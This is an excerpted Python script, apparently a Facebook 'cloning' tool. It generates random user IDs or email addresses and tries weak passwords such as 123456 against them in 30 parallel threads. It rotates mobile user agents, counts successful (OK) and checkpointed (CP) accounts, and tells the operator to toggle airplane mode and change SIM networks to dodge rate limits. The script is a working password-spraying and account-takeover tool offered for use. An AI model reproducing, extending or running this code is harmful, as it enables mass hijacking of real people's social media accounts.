...
class Main:
	def __init__(self):
		...
		print(logo)
		print("\n") 
		cetak(nel("[white] Status: [green]online[purple]"))
		tamp_new = (f'{H2}Github : https://github.com/AlifXyz        {H2}Please Change Your Sim Network Before Cloning\n\n       {H2}Toll Modified By AlifXyz ')
		printer(Panel(tamp_new,title=f'{H2}[ {P2}INFO SCRIPT{H2} ]',width=54,padding=(1,4),style='#00FF00'))
		print("") 
		sky = '[bold green][01]─➤ Clone Random UID 2010 - 2015\n[02]─➤ Clone Random UID 2009 - 2010\n[03]─➤ Clone Random UID 2009\n[04]─➤ Clone Random UID 2007 - 2008\n[05]─➤ Clone Random UID 2005 - 2006\n[06]─➤ Clone Random UID 2003 - 2004\n[07]─➤ Email Cloning\n[08]─➤ Clone Random UID Custom\n[00]─➤ Exit [/bold green]'
		sky2 = nel(sky, style='green')
		cetak(nel(sky2,title='[bold green]─➤ Cloning Menu [/bold green]'))
		romii =input("\033[0;97m> Pilih:─➤ ")
		if romii in ["1", "01"]:
				self.old2()
		if romii in ["2", "02"]:
				self.fbtua()
		...
		if romii in ["8", "08"]:
				self.oldcrack()
		if romii in ["0", "00"]:
			jalan("\n\n\033[1;92m─➤ Oklay Selamat Jalan Brooot\n")
			time.sleep(3)
			exit()
		else:
	...
	def old_9(self):
		...
		xx = 999999
		idx = "100000000"
		cetak(nel("[yellow]─➤ Total IDs To Crack Limit 50,0000[purple]"))
		limit = int(input("\033[0;97m─➤ Enter Crack Limit: "))
		if (limit)>500000:
			exit("\n%s\033[0;97m─➤ Don't Cross The Limit Broot:)"%(R))
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				tamp_new = (f'{H2}─➤ Use Password: 123456,1234567,12345678,123456789{H2}')
				printer(Panel(tamp_new,title=f'{H2}[ {H2}─➤ Password{H2} ]',width=54,padding=(1,4),style='#00FF00'))
				listpass = input("%s\033[0;97m─➤ Enter Password:%s\033[0;97m "%(G,Y))
				cetak(nel("[yellow]─➤ CP Ids Open In Offical FB After Clear Data\n[red]─➤ If Checkpoint! Open After 10 Days in Via Browser\n> [red]ON [white]| [green]OFF [white]─➤ Airplane Mode Every 5 Mint For Speed Up[purple]"))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			back =input("\n\n\033[0;92m─➤ Process has been completed...\n\033[0;93m•\033[0;92m Press Enter to Back Menu ")
			Main() 
	...
	def old4_6(self):
		...
		cetak(nel("[yellow]─➤ Total IDs To Crack Limit 10,000[purple]"))
		limit = int(input("\033[0;91m•\033[0;97m Enter Crack Limit: "))
		if (limit)>10000:
			exit("\n%s\033[0;91m•\033[0;97m─➤ Don't Cross The Limit Broot:)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				printer(Panel(tamp_new,title=f'{H2}[ {H2}Password{H2} ]',width=54,padding=(1,4),style='#00FF00'))
				listpass = input("%s\033[0;97m─➤ Enter Password:%s\033[0;97m "%(G,Y))
				cetak(nel("[yellow]─➤ CP Ids Open In Offical FB After Clear Data\n[red]─➤ If Checkpoint! Open After 10 Days in Via Browser\n[white]> [red]ON [white]| [green]OFF [white]─➤ Airplane Mode Every 5 Mint For Speed Up[purple]"))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			back =input("\n\n\033[0;92m─➤ Process has been completed...\n\033[0;93m•\033[0;92m Press Enter to Back Menu ")
			Main() 
	...
	def oldcrack(self):
		x = 11111111
		xx = 99999999
		idx = input("%s\033[0;91m[\033[0;97m+\033[0;91m] \033[0;97mEnter a Digit\033[0;91m(\033[0;97m1-9\033[0;91m):\033[0;97m %s"%(Y,G))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		cetak(nel("[yellow]─➤ Total IDs To Crack Limit 50,0000[purple]"))
		limit = int(input("\033[0;97m─➤ Enter Crack Limit: "))
		if (limit)>500000:
	...
	def old2(self):
		...
		xx = 9999999999
		idx = "10000"
		cetak(nel("[yellow] Total IDs To Crack Limit 70,000[purple]"))
		limit = int(input("\033[0;97m> Enter Crack Limit: "))
		if (limit)>70000:
			exit("\n%s\033[0;97m> Don't Cross The Limit Beb:)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
	...
	def old4_5(self):
		...
		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		cetak(nel("[yellow]─➤ Total IDs To Crack Limit 50,000[purple]"))
		limit = int(input("\033[0;97m─➤ Enter Crack Limit: "))
		if (limit)>50000:
			exit("\n%s\033[0;97m─➤ Don't Cross The Limit Broot:)"%(R))
		try:
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s\033[0;91m[\033[0;97m?\033[0;91m] \033[0;97mType a Name%s\033[0;91m(\033[0;97m─➤ Ex: Rangga, Putri\033[0;91m):\033[0;97m "%(Y,G))
		nam = nam.replace(" ", "")
		print("%s\x1b[1;97m\x1b[1;41m─➤ Example\x1b[0m  - %s@gmail.com, @yahoo.com, @hotmail.com ETC"%(Y,G))
		idx = input("%sDomain  : "%(B))
		cetak(nel("[yellow]─➤ Total IDs To Crack Limit 45,000[purple]"))
		limit = int(input("\033[0;97m─➤ Enter Crack Limit: "))
		if (limit)>45000:
			exit("\n%s\033[0;97m─➤ Don't Cross The Limit Broot:)"%(R))
		try:
	...
	def api(self, uid, pwx):
		rua = random.choice([
			...
			"Mozilla/5.0 (Linux; Android 7.1.2; 17MB150WB Build/NZH54D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.121 Safari/537.36", 
			...
			"Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 12; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 11; LM-G820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36", 
			...
			"Mozilla/5.0 (Linux; Android 12; SM-G781U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36", 
			...
			"Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 11; SM-A125U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 12; SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 11; moto g power (2021)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 12; SM-A136U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 12; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36", 
			"Podimo/2.20.1 build 433/Android 31", 
			...
			"Mozilla/5.0 (Linux; Android 12; SM-G986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; U; Android 2.0.1; en-us; Droid Build/ESD56) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; Android 10; SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36", 
			...
			"Mozilla/5.0 (Linux; Android 12; SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36", 
			...
			"Mozilla/5.0 (Linux; Android 11; moto g play (2021)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 10; LM-Q730) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36", 
			...
			"Mozilla/5.0 (Linux; Android 12; SM-G991U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]", 
		...
		sys.stdout.write(
			"\r \033[0;97m%s|%s \033[0;92mOK\033[0;97m|\033[0;91mCP \033[0;92m%s\033[0;97m|\033[0;91m%s\033[0;92m  "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
